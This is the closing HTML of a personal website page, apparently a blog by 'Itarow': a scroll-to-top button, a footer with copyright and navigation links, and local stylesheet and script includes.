        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2022  Itarow 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>
<script src=/js/code-copy.js></script>



</html>
